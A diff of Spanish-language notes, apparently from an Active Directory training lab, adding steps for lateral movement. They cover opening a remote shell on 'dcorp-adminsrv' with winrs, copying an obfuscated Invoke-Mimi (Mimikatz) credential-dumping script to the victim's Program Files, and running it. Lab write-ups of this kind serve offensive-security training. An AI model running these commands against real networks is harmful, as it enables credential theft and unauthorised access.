@@ -159,6 +159,10 @@ Find-PSRemotingLocalAdminAccess
 ```
 
 Vemos que tenemos privilegio de administrador local en la maquina *dcorp-adminsrv*
+Nos conectaremos a la maquina
+```shell
+winrs -r:dcorp-adminsrv cmd
+```
 
 A continuación vamos a enumerar los servicios corriendo en esta maquina
 ```shell
@@ -238,7 +242,9 @@ $Pwn = $8 + $c + $g + $t + $p + $n + $7 + $6 + $l + $2 + $z + $e + $0 + $s + $1 
 Invoke-Mimi -Command $Pwn
 ```
 
-AHora una vez el archivo modificado lo transferiremos a la maquina victima
+Ahora una vez el archivo modificado lo transferiremos a la maquina victima
 ```shell
 Copy-Item C:\AD\Tools\Invoke-MimiEX-keys-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
 ```
+
+Una vez copiado en la maquina victima nos vamos al directorio donde lo hemos copiado en este caso *Program Files* y lo ejecutamos
